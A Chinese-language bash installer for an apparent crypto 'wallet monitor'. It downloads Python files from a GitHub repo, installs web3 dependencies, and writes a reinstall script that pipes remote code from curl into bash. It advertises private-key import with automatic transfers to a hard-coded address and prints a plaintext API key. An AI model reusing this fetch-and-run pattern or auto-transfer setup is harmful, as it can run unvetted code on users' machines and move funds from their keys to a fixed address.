#!/bin/bash

# 钱包监控系统一键安装脚本
# 自动下载、检测环境并安装所有依赖

set -e  # 遇到错误立即退出

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# 打印标题
print_header() {
    echo -e "${BLUE}======================================================================${NC}"
    echo -e "${BLUE}🚀 钱包监控系统一键安装脚本${NC}"
    echo -e "${BLUE}   自动下载、安装依赖并启动钱包监控系统${NC}"
    echo -e "${BLUE}   支持所有Alchemy EVM兼容链的钱包监控和自动转账${NC}"
    echo -e "${BLUE}======================================================================${NC}"
}

# 检查操作系统
check_os() {
    echo -e "\n${CYAN}📋 检查操作系统...${NC}"
    
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        OS="linux"
        echo -e "✅ 检测到 Linux 系统"
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        OS="macos"
        echo -e "✅ 检测到 macOS 系统"
    elif [[ "$OSTYPE" == "cygwin" ]] || [[ "$OSTYPE" == "msys" ]] || [[ "$OSTYPE" == "win32" ]]; then
        OS="windows"
        echo -e "✅ 检测到 Windows 系统"
    else
        OS="unknown"
        echo -e "${YELLOW}⚠️  未知操作系统: $OSTYPE${NC}"
    fi
}

# 检查下载工具
check_download_tools() {
    echo -e "\n${CYAN}📋 检查下载工具...${NC}"
    
    if command -v curl &> /dev/null; then
        DOWNLOAD_CMD="curl"
        echo -e "✅ 找到 curl"
        return 0
    elif command -v wget &> /dev/null; then
        DOWNLOAD_CMD="wget"
        echo -e "✅ 找到 wget"
        return 0
    else
        echo -e "${RED}❌ 未找到 curl 或 wget${NC}"
        echo -e "${YELLOW}💡 请安装 curl 或 wget:${NC}"
        case $OS in
            "macos")
                echo -e "   brew install curl"
                ;;
            "linux")
                echo -e "   sudo apt install curl  # Ubuntu/Debian"
                echo -e "   sudo yum install curl  # CentOS/RHEL"
                ;;
        esac
        return 1
    fi
}

# 下载项目文件
download_files() {
    echo -e "\n${CYAN}📥 下载项目文件...${NC}"
    
    # GitHub仓库的raw文件URL
    BASE_URL="https://raw.githubusercontent.com/haohaoi34/jiankong/main"
    
    # 需要下载的文件列表
    files=("wallet_monitor.py" "wallet_monitor_launcher.py")
    
    for file in "${files[@]}"; do
        echo -e "📥 下载 $file..."
        
        if [ "$DOWNLOAD_CMD" = "curl" ]; then
            if curl -fsSL "$BASE_URL/$file" -o "$file"; then
                echo -e "✅ $file 下载成功"
            else
                echo -e "${RED}❌ $file 下载失败${NC}"
                return 1
            fi
        elif [ "$DOWNLOAD_CMD" = "wget" ]; then
            if wget -q "$BASE_URL/$file" -O "$file"; then
                echo -e "✅ $file 下载成功"
            else
                echo -e "${RED}❌ $file 下载失败${NC}"
                return 1
            fi
        fi
    done
    
    echo -e "${GREEN}✅ 所有文件下载完成${NC}"
    return 0
}

# 检查Python
check_python() {
    echo -e "\n${CYAN}📋 检查Python...${NC}"
    
    # 尝试不同的Python命令
    PYTHON_CMD=""
    for cmd in python3 python python3.11 python3.10 python3.9 python3.8; do
        if command -v $cmd &> /dev/null; then
            # 检查版本
            VERSION=$($cmd -c "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}')")
            MAJOR=$(echo $VERSION | cut -d. -f1)
            MINOR=$(echo $VERSION | cut -d. -f2)
            
            if [ "$MAJOR" -eq 3 ] && [ "$MINOR" -ge 8 ]; then
                PYTHON_CMD=$cmd
                echo -e "✅ 找到合适的Python: $cmd (版本 $VERSION)"
                break
            else
                echo -e "${YELLOW}⚠️  $cmd 版本过低: $VERSION${NC}"
            fi
        fi
    done
    
    if [ -z "$PYTHON_CMD" ]; then
        echo -e "${RED}❌ 未找到Python 3.8+${NC}"
        echo -e "${YELLOW}💡 请安装Python 3.8或更高版本${NC}"
        
        # 提供安装建议
        case $OS in
            "macos")
                echo -e "   建议使用Homebrew安装: brew install python"
                ;;
            "linux")
                echo -e "   Ubuntu/Debian: sudo apt update && sudo apt install python3 python3-pip"
                echo -e "   CentOS/RHEL: sudo yum install python3 python3-pip"
                ;;
            "windows")
                echo -e "   请从 https://python.org 下载安装Python"
                ;;
        esac
        return 1
    fi
    
    return 0
}

# 检查pip
check_pip() {
    echo -e "\n${CYAN}📋 检查pip...${NC}"
    
    if $PYTHON_CMD -m pip --version &> /dev/null; then
        echo -e "✅ pip可用"
        return 0
    else
        echo -e "${RED}❌ pip不可用${NC}"
        echo -e "${YELLOW}💡 尝试安装pip...${NC}"
        
        # 尝试安装pip
        case $OS in
            "macos")
                if command -v brew &> /dev/null; then
                    brew install python
                else
                    echo -e "${YELLOW}请安装Homebrew或手动安装pip${NC}"
                fi
                ;;
            "linux")
                if command -v apt &> /dev/null; then
                    sudo apt update && sudo apt install python3-pip
                elif command -v yum &> /dev/null; then
                    sudo yum install python3-pip
                else
                    echo -e "${YELLOW}请手动安装pip${NC}"
                fi
                ;;
        esac
        
        return 1
    fi
}

# 安装依赖包
install_dependencies() {
    echo -e "\n${CYAN}📦 安装Python依赖包...${NC}"
    
    packages=("web3" "eth-account" "alchemy-sdk" "colorama" "aiohttp" "cryptography")
    
    for package in "${packages[@]}"; do
        echo -e "📦 安装 $package..."
        if $PYTHON_CMD -m pip install "$package" --upgrade; then
            echo -e "✅ $package 安装成功"
        else
            echo -e "${RED}❌ $package 安装失败${NC}"
            return 1
        fi
    done
    
    echo -e "${GREEN}✅ 所有依赖包安装完成${NC}"
    return 0
}

# 测试安装
test_installation() {
    echo -e "\n${CYAN}🧪 测试安装...${NC}"
    
    # 创建测试脚本
    cat > test_imports.py << 'EOF'
try:
    from alchemy import Alchemy, Network
    from web3 import Web3
    from eth_account import Account
    import colorama
    import aiohttp
    import cryptography
    print("✅ 所有依赖导入成功")
    
    # 测试Alchemy
    alchemy = Alchemy("test", Network.ETH_MAINNET)
    print("✅ Alchemy SDK测试通过")
    
    print("🎉 安装测试完全通过！")
    exit(0)
except Exception as e:
    print(f"❌ 测试失败: {e}")
    exit(1)
EOF
    
    if $PYTHON_CMD test_imports.py; then
        echo -e "${GREEN}✅ 安装测试通过${NC}"
        rm -f test_imports.py
        return 0
    else
        echo -e "${RED}❌ 安装测试失败${NC}"
        rm -f test_imports.py
        return 1
    fi
}

# 检查主程序文件
check_main_files() {
    echo -e "\n${CYAN}📋 检查主程序文件...${NC}"
    
    # 如果文件不存在，尝试下载
    if [ ! -f "wallet_monitor.py" ] || [ ! -f "wallet_monitor_launcher.py" ]; then
        echo -e "${YELLOW}⚠️  主程序文件不存在，尝试从GitHub下载...${NC}"
        if ! download_files; then
            echo -e "${RED}❌ 文件下载失败${NC}"
            echo -e "${YELLOW}💡 请检查网络连接或手动下载文件:${NC}"
            echo -e "   curl -O https://raw.githubusercontent.com/haohaoi34/jiankong/main/wallet_monitor.py"
            echo -e "   curl -O https://raw.githubusercontent.com/haohaoi34/jiankong/main/wallet_monitor_launcher.py"
            return 1
        fi
    fi
    
    if [ -f "wallet_monitor.py" ]; then
        echo -e "✅ wallet_monitor.py 存在"
    else
        echo -e "${RED}❌ wallet_monitor.py 仍然不存在${NC}"
        return 1
    fi
    
    if [ -f "wallet_monitor_launcher.py" ]; then
        echo -e "✅ wallet_monitor_launcher.py 存在"
    else
        echo -e "${YELLOW}⚠️  wallet_monitor_launcher.py 不存在${NC}"
    fi
    
    return 0
}

# 创建运行脚本
create_scripts() {
    echo -e "\n${CYAN}📝 创建运行脚本...${NC}"
    
    # 创建启动脚本
    cat > run_wallet_monitor.sh << EOF
#!/bin/bash
echo "🚀 启动钱包监控系统..."
$PYTHON_CMD wallet_monitor.py
EOF
    
    chmod +x run_wallet_monitor.sh
    echo -e "✅ 创建运行脚本: run_wallet_monitor.sh"
    
    # 创建重新安装脚本
    cat > reinstall.sh << EOF
#!/bin/bash
echo "🔄 重新安装钱包监控系统..."
curl -fsSL https://raw.githubusercontent.com/haohaoi34/jiankong/main/install.sh | bash
EOF
    
    chmod +x reinstall.sh
    echo -e "✅ 创建重装脚本: reinstall.sh"
}

# 显示完成信息
show_completion() {
    echo -e "\n${GREEN}🎉 钱包监控系统安装完成！${NC}"
    echo -e "${BLUE}======================================================================${NC}"
    echo -e "${YELLOW}📝 使用方法:${NC}"
    echo -e "   1. 直接启动: ${CYAN}./run_wallet_monitor.sh${NC}"
    echo -e "   2. 手动启动: ${CYAN}$PYTHON_CMD wallet_monitor.py${NC}"
    echo -e "   3. 重新安装: ${CYAN}./reinstall.sh${NC}"
    echo -e ""
    echo -e "${YELLOW}📋 功能说明:${NC}"
    echo -e "   • 支持所有Alchemy EVM兼容链"
    echo -e "   • 智能私钥导入和识别"
    echo -e "   • 自动余额监控和转账"
    echo -e "   • 断点续传和状态保存"
    echo -e ""
    echo -e "${YELLOW}🎯 目标转账地址:${NC} 0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"
    echo -e "${YELLOW}🔑 API密钥:${NC} S0hs4qoXIR1SMD8P7I6Wt"
    echo -e "${BLUE}======================================================================${NC}"
}

# 主函数
main() {
    print_header
    
    # 检查操作系统
    check_os
    
    # 检查下载工具
    if ! check_download_tools; then
        echo -e "\n${RED}❌ 下载工具检查失败${NC}"
        exit 1
    fi
    
    # 下载主程序文件
    if ! download_files; then
        echo -e "\n${RED}❌ 文件下载失败${NC}"
        exit 1
    fi
    
    # 检查Python
    if ! check_python; then
        echo -e "\n${RED}❌ Python检查失败${NC}"
        exit 1
    fi
    
    # 检查pip
    if ! check_pip; then
        echo -e "\n${RED}❌ pip检查失败${NC}"
        exit 1
    fi
    
    # 安装依赖
    if ! install_dependencies; then
        echo -e "\n${RED}❌ 依赖安装失败${NC}"
        exit 1
    fi
    
    # 测试安装
    if ! test_installation; then
        echo -e "\n${YELLOW}⚠️  安装测试失败，但可以尝试继续运行${NC}"
    fi
    
    # 创建脚本
    create_scripts
    
    # 显示完成信息
    show_completion
    
    # 询问是否立即启动
    echo -e "\n${CYAN}是否立即启动钱包监控系统? (y/N): ${NC}"
    read -r choice
    if [[ "$choice" =~ ^[Yy]$ ]]; then
        echo -e "\n${GREEN}🚀 启动钱包监控系统...${NC}"
        $PYTHON_CMD wallet_monitor.py
    else
        echo -e "\n${GREEN}💡 稍后可以运行: ./run_wallet_monitor.sh${NC}"
    fi
}

# 运行主函数
main "$@"
